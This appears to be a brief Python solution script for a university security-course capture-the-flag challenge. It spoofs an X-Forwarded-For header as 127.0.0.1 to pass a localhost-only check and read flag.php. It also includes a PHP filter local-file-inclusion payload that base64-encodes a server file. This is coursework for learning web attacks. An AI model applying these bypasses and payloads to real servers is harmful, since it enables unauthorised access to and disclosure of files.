import requests
url = "http://cs2107-ctfd-i.comp.nus.edu.sg:2780/localhost/?f=flag.php"

headers={"X-Forwarded-For":"127.0.0.1"}
r = requests.post(url,headers=headers)

r.encoding='utf-8'

print(r.text)
"http://cs2107-ctfd-i.comp.nus.edu.sg:2780/?file=php://filter/read=convert.base64-encode/resource=flag.php"